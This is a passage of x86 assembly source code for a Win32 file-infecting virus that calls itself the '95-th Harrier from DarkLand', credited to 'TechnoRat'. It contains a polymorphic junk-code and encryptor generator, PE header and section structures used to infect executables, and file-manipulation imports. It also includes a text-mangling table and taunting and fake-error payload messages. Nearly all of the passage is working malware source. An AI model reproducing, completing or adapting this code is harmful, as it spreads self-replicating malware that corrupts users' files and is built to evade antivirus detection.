GenNoFlag_5_1$:	Pop	ECx
		Pop	EAx
		Or	Al,8h
		StosB
		Ret

GenNoFlag_6$:	Dec	EAx
		Jnz	GenNoFlag_7$		; ">6"
		Mov	Al,10h			; Jcc $+2
		Call	Random
		Or	Al,70h
		StosB
		Xor	Al,Al
		StosB
		Ret

GenNoFlag_7$:	Dec	EAx
		Jnz	GenNoFlag_8$		; ">7"
		Mov	Al,0EBh			; Jmps $+?
		StosB
		Mov	Al,20h			; Jmp distance. . .
		Call	Random
		StosB
		Push	ECx
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoFlag_7_1$
GenNoFlag_7_2$:	Mov	EAx,100h
		Call	Random
		StosB
		Dec	ECx
		Jnz	GenNoFlag_7_2$
GenNoFlag_7_1$:	Pop	ECx
		Ret

GenNoFlag_8$:	Dec	EAx
		Jnz	GenNoFlag_9$		; ">8"
		Mov	Al,60h			; PushA / PopA
		StosB
		Push	ECx			; Some seria of commands
		Mov	EAx,5h			; How many. . .
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoFlag_8_1$
GenNoFlag_8_2$:	Call	GenNoFlagCom
		Dec	ECx
		Jnz	GenNoFlag_8_2$
GenNoFlag_8_1$:	Pop	ECx
		Mov	Al,61h
		StosB
		Ret

GenNoFlag_9$:	Mov	Al,9Ch			; PushF / PopF
		StosB
		Push	ECx			; Some seria of commands
		Mov	EAx,5h			; How many. . .
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoFlag_9_1$
GenNoFlag_9_2$:	Call	GenNoFlagCom
		Dec	ECx
		Jnz	GenNoFlag_9_2$
GenNoFlag_9_1$:	Pop	ECx
		Mov	Al,9Dh
		StosB
		Ret

; ---------------------------------------------------------
GetNoEqRegs0:	Call	GetNoESpReg		; Get Registers Mod R/M
		Push	EBx			; byte with any NoEq
		Mov	Bl,Al			; registers inside
		Call	GetNoESpReg		; this pack (without ESp)
		Shl	Al,3h
		Or	Al,Bl
		Or	Al,0C0h
		Pop	EBx
		Ret

GetNoEqRegs:	Call	GetReg			; Get Registers Mod R/M
		Push	EBx			; byte with any NoEq
		Mov	Bl,Al			; registers inside
		Call	GetReg			; this pack
		Shl	Al,3h
		Or	Al,Bl
		Or	Al,0C0h
		Pop	EBx
		Ret

GetEqRegs:	Call	GetReg			; Get Registers Mod R/M
		Mov	Ah,Al			; byte with any Eq registers
		Shl	Al,3h			; inside this pack
		Or	Al,Ah
		Or	Al,0C0h
		Ret

GetNoESpReg:	Call	GetReg			; Get register number
		Cmp	Al,4h			; but without ESP
		Je	GetNoESPReg
		Ret

GetReg:		Mov	EAx,8h			; Get register number
		Call	Random
		Ret

; ---------------------------------------------------------
Enumer:		Push	EAx			; Enumerates the some
		Push	ECx			; procedure in EBx
		Mov	EAx,ECx			; ECx times with
		Call	Random			; parameters in EAx
		Or	ECx,ECx
		Jz	Enumer_0$
Enumer_1$:	Mov	EAx,[ESp][4]
		Call	EBx
		Dec	ECx
		Jnz	Enumer_1$
Enumer_0$:	Pop	ECx
		Pop	EAx
		Ret

; ---------------------------------------------------------
StoreByte:	Cmp	Byte Ptr pEnableEncr,0h	; Stores the Byte data
		Je	StoreByte_0$		; into encryptor buffer
		Mov	[ESi],Al
		Inc	ESi
StoreByte_0$:	Ret

StoreWord:	Cmp	Byte Ptr pEnableEncr,0h	; Stores the Word data
		Je	StoreWord_0$		; into encryptor buffer
		Mov	[ESi],Ax
		Add	ESi,2h
StoreWord_0$:	Ret

StoreDWord:	Cmp	Byte Ptr pEnableEncr,0h	; Stores the DWord data
		Je	StoreDWord_0$		; into encryptor buffer
		Mov	[ESi],EAx
		Add	ESi,4h
StoreDWord_0$:	Ret

; ---------------------------------------------------------
Random:		Push	EDx			; Generate some random number
		Push	ECx			; to EAx by border in EAx
		Push	EAx			; (0..Border-1)
		Mov	EAx,RandSeed		; Don't corrupt registers
		Mov	ECx,8088405h		; [from TurboPascal v7.0]
		Mul	ECx			; (Based on Congruent
		Inc	EAx			; generating algorythm)
		Mov	RandSeed,EAx
		Pop	ECx
		Mul	ECx
		Pop	ECx
		Mov	EAx,EDx
		Pop	EDx
		Ret

;Separator=_Nop
; ---------------------------------------------------------
; Data for convertor
;DefCodeLine
ConvertDataLen	=	4h
ConvertData	Label	DWord
		Dd	Offset SearchStr1
		Dd	Offset ReplaceStr1

		Dd	Offset SearchStr2
		Dd	Offset ReplaceStr2

		Dd	Offset SearchStr3
		Dd	Offset ReplaceStr3

		Dd	Offset SearchStr4
		Dd	Offset ReplaceStr4
;BreakCodeLine

SearchStr1	Db	'MICROSOFT',0
SearchStr2	Db	'WINDOWS',0
SearchStr3	Db	'BILL GATES',0
SearchStr4	Db	'HARRIER',0

ReplaceStr1	Db	'MIcrOSOFT',0
ReplaceStr2	Db	'WINDOwS',0
ReplaceStr3	Db	'Gill Bates',0
ReplaceStr4	Db	'Oh! Guys! Is it about me?',0

; ---------------------------------------------------------
;DefCodeLine
InfoName	Db	'OEMINFO.INI',0h
InfoNameL	=	$-InfoName
;BreakCodeLine
;DefCodeLine
BitMapName	Db	'OEMLOGO.BMP',0h
BitMapNameL	=	$-BitMapName
;BreakCodeLine

SelfSectionName	Db	'.TEXT',0,0,0

InfSelfHeader	Db	'"95-th Harrier from DarkLand"',0
InfEnterDebug	Db	'Entering to DEBUG mode.',0
InfCancelMsg	Db	'Infecting aborted by Creator!',0
InfNoNameMsg	Db	'Name not specified.',0

;DefCodeLine
HelloMsg	Label	Byte
Db 'Oops, World, it is Me!',Cr
Db 'Can You image it? I am the Win32 platform based virus!',Cr
Db 'Hey, Daniloff! Will You porte Your DrWeb at this platform?',Cr
Db 'Hmm, Guy, what You think about Watcom C++ ?',Cr
Db Cr
Db 'Greetings goes to Gill Bates and to her Mircosoft Windoze 95 sucks,',Cr
Db '           and to rest lame part of world.',Cr
Db Cr
Db 'Ugly Lamers MUST DIE!',Cr
Db Cr
Db 'Who am I ?   I am the "95-th Harrier from DarkLand" !!!',Cr
Db 'I come from dark, I invade Your PC and now I will invade Your mind. . .',Cr
Db Cr
Db '                                                              TechnoRat',Cr
Db Cr
Db Ver,Release,BasedOn,Cr
Db 0
;BreakCodeLine

InfGodHelp	Db	'God will help! ;-)',0

; ---------------------------------------------------------
;DefCodeLine
FuckMsgCounter	=	6h
FuckMessages	Label	DWord
		Dd	FuckMsg1,FuckMsg2,FuckMsg3,FuckMsg4,FuckMsg5,FuckMsg6
;BreakCodeLine

FuckMsg1	Db	'System malfunction!',0
FuckMsg2	Db	'VXDs rings overcrossed!',0
FuckMsg3	Db	'CPU mode thunking error!',0
FuckMsg4	Db	'CPU overclocked, cooler device emergency!',0
FuckMsg5	Db	'Help subsystem is damaged!',0
FuckMsg6	Db	'Attention! Bugs inside computer, use SoftIce.',0

; ---------------------------------------------------------
; Here will be placed the very nice files. . .
		BFile	BitMapFile,HarrLogo.Bmp,HarrBtMpFile_Sz
		BFile	InfoFile,HarrInfo.Ini,HarrInfoFile_Sz

MemBase		Dd	?			; Program base in memory
HostIP		Dd	?			; for returning to host
Here		Dd	?			; self place in RAM
Debug		Dd	0h			; debugging flag
HelpCounter	Dd	0h			; for FuckingHelp ;-)
InitOk		Dd	1h			; Initialize semaphore:
						; 0 - process performing
						; 1 - must be initialized
						; 2 - initialized Ok.

; ---------------------------------------------------------
; Real copyright by creator.
;DefCodeLine
		Irpc	Char,<(C)reated by TechnoRat (hacker)>
		Db	'&Char' Xor 0FFh
		EndM
;BreakCodeLine

; ---------------------------------------------------------
RandSeed	Dd	?
StubEntryLabel	Dd	?
ImagePlace	Dd	?
CurrentPlace	Dd	?
PolyMorphSz	Dd	0h			; The size of decriptors
StubImportPlace	Dd	?
ImportPlace	Dd	?
ImportLength	Dd	?
BufferPlace	Dd	?

; ---------------------------------------------------------
; The Virtual stack variables
		Var	DosHeader	,40h	; Dos Header place
		Var	FileHandle	,DWord	; Generic file variables
		Var	FileAttributes	,DWord
		Var	FileNamePtr	,DWord
		Var	FileLastWrite	,8h	; Generic file Date/Time
		Var	FileLastAccess	,8h
		Var	FileCreation	,8h
		Var	ProcessedBytes	,DWord
		Var	NewSeconds	,Word
		Var	PackedTime	,8h
		Var	SomePath	,MaxPathLen

		Var	PEFileHeaders	,DWord

		Var	ImportLegal	,DWord	; Import section parameters
		Var	ImportPhysOffs	,DWord
		Var	ImportRVA	,DWord
		Var	ImportFlags	,DWord
		Var	ImportOrder	,DWord

;DefCodeLine
		Var	FT_Struc	,0h	; System Time description
		Var	FT_Year		,Word
		Var	FT_Month	,Word
		Var	FT_DayOfWeek	,Word
		Var	FT_Day		,Word
		Var	FT_Hour		,Word
		Var	FT_Minute	,Word
		Var	FT_Second	,Word
		Var	FT_Milliseconds	,Word
;BreakCodeLine

		Var	pBaseReg	,Byte	; PolyMorph gen. vars
		Var	pSemReg		,Byte
		Var	pEnableEncr	,Byte
		Var	pBase		,DWord
		Var	pSem		,DWord
		Var	pXchg		,DWord
		Var	pMov		,DWord
		Var	pBaseAdd	,DWord
		Var	pBaseSub	,DWord
		Var	pAgain		,DWord
		Var	pAgain_E	,DWord
		Var	pAdd		,DWord

		Var	GenSz		,DWord	; PolyMorph link vars
		Var	GenCrSz		,DWord
		Var	GenTotalSz	,DWord
		Var	Cryptors	,2*4*16
		Var	CryptCnt	,DWord

;DefCodeLine
		Var	Section		,0h
SectBegin	=	_VarAddr		; Section header description
		Var	SectName	,8h
		Var	SectVirtSize	,DWord
		Var	SectRVA		,DWord
		Var	SectPhysSize	,DWord
		Var	SectPhysOffs	,DWord
		Var	SectR		,3*4h
		Var	SectFlags	,DWord
SectSize	=	_VarAddr-SectBegin
;BreakCodeLine

;DefCodeLine
		Var	SelfSection	,0h
SelfSectBegin	=	_VarAddr		; Self section description
		Var	SelfSectName	,8h
		Var	SelfSectVirtSize,DWord
		Var	SelfSectRVA	,DWord
		Var	SelfSectPhysSize,DWord
		Var	SelfSectPhysOffs,DWord
		Var	SelfSectR	,3*4h
		Var	SelfSectFlags	,DWord
SelfSectSize	=	_VarAddr-SelfSectBegin
;BreakCodeLine

;DefCodeLine
		Var	PEHeader	,0h
PEHeaderBegin	=	_VarAddr		; PE Header description
		Var	PE_Sign		,DWord
		Var	PE_CPUType	,Word
		Var	PE_NumOfSections,Word
		Var	PE_TimeDate	,DWord
		Var	PE_PtrToCOFFTbl	,DWord
		Var	PE_COFFTblSize	,DWord
		Var	PE_NTHdrSize	,Word
		Var	PE_Flags	,Word
		Var	PE_Magic	,Word
		Var	PE_LMajor	,Byte
		Var	PE_LMinor	,Byte
		Var	PE_SizeOfCode	,DWord
		Var	PE_SizeOfIData	,DWord
		Var	PE_SizeOfUIData	,DWord
		Var	PE_EntryPointRVA,DWord
		Var	PE_BaseOfCode	,DWord
		Var	PE_BaseOfData	,DWord
		Var	PE_ImageBase	,DWord
		Var	PE_ObjectAlign	,DWord
		Var	PE_FileAlign	,DWord
		Var	PE_OsMajor	,Word
		Var	PE_OsMinor	,Word
		Var	PE_UserMajor	,Word
		Var	PE_UserMinor	,Word
		Var	PE_SubSysMajor	,Word
		Var	PE_SubSysMinor	,Word
		Var	PE_R1		,DWord
		Var	PE_ImageSize	,DWord
		Var	PE_HeaderSize	,DWord
		Var	PE_FileChkSum	,DWord
		Var	PE_SubSystem	,Word
		Var	PE_DllFlags	,Word
		Var	PE_StackReserveSz,DWord
		Var	PE_StackCommitSz,DWord
		Var	PE_HeapReserveSz,DWord
		Var	PE_HeapCommitSz	,DWord
		Var	PE_LoaderFlags	,DWord
		Var	PE_NumOfRVAAndSz,DWord
		Var	PE_ExportTableRVA,DWord
		Var	PE_ExportDataSz	,DWord
		Var	PE_ImportTableRVA,DWord
		Var	PE_ImportDataSz	,DWord
		Var	PE_RsrcTableRVA	,DWord
		Var	PE_RsrcDataSz	,DWord
		Var	PE_ExceptTableRVA,DWord
		Var	PE_ExceptDataSz	,DWord
		Var	PE_SecurTableRVA,DWord
		Var	PE_SecurDataSz	,DWord
		Var	PE_FixUpTableRVA,DWord
		Var	PE_FixUpDataSz	,DWord
		Var	PE_DebugTableRVA,DWord
		Var	PE_DebugDataSz	,DWord
		Var	PE_ImageDescrRVA,DWord
		Var	PE_DescriptionSz,DWord
		Var	PE_MachineSpecRVA,DWord
		Var	PE_MachineSpecSz,DWord
		Var	PE_TLSRVA	,DWord
		Var	PE_TLSSz	,DWord
		Var	PE_R0		,30h
PEHeaderSize	=	_VarAddr-PEHeaderBegin

		If	PEHeaderSize NE 0F8h
		.Err	'PEHeader described incorrectly!'
		EndIf
;BreakCodeLine
;StopCode
		Var	VeryLargeBuffer	,0h	; Rest of memory ;-)

; ---------------------------------------------------------
_VarAddr	=	0h
		Var	ConvertVar	,4*4	; Tiny Stack variables
		Var	SmallBuffer	,0h	; (memory buffer)

; ---------------------------------------------------------
;StartData
		Extern	MessageBoxA:Proc	; External functions
		Extern	CreateFileA:Proc	; which imported
		Extern	SetFilePointer:Proc	; form some system
		Extern	CloseHandle:Proc	; DLL's (providers
		Extern	ReadFile:Proc		; of this functions)
		Extern	WriteFile:Proc
		Extern	SetFilePointer:Proc
		Extern	GetFileAttributesA:Proc
		Extern	SetFileAttributesA:Proc
		Extern	GetFileTime:Proc
		Extern	SetFileTime:Proc
		Extern	CopyFileA:Proc
		Extern	MoveFileA:Proc
		Extern	GetEnvironmentStringsA:Proc
		Extern	MessageBeep:Proc
		Extern	FileTimeToSystemTime:Proc
		Extern	SystemTimeToFileTime:Proc
		Extern	GetSystemTime:Proc
		Extern	GetSystemDirectoryA:Proc
;StopData

; ---------------------------------------------------------
		End	Start

; *==================================================================*
; !                     T I M E   T O   D I E                        !
; *==================================================================*
